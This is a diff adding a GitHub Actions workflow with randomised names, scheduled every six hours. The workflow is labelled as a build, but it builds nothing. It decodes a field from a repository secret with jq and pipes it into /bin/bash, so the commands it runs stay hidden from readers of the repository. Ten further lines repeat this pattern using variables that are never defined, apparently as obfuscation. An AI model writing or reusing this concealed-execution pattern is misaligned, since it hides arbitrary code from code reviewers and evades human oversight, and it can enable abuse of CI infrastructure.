@@ -1,0 +1,27 @@
+name: sanliangjinn
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sanliangjinn
+        env:
+          zm18622: ${{ secrets.zm18622 }}
+        run: |
+          echo $zm18622 | jq -r .y2 | /bin/bash
+          echo $d93 | jq -r .ej601 | /bin/bash
+          echo $o18725 | jq -r .n135 | /bin/bash
+          echo $zr49574 | jq -r .ubr93 | /bin/bash
+          echo $jseex58540 | jq -r .ofq05766 | /bin/bash
+          echo $dx3024 | jq -r .t2 | /bin/bash
+          echo $nih02723 | jq -r .keez31171 | /bin/bash
+          echo $wt0 | jq -r .sh4420 | /bin/bash
+          echo $fugt13934 | jq -r .kn4 | /bin/bash
+          echo $hq6 | jq -r .kjxa01 | /bin/bash
+          echo $pdbff420 | jq -r .zkyuo4876 | /bin/bash
+
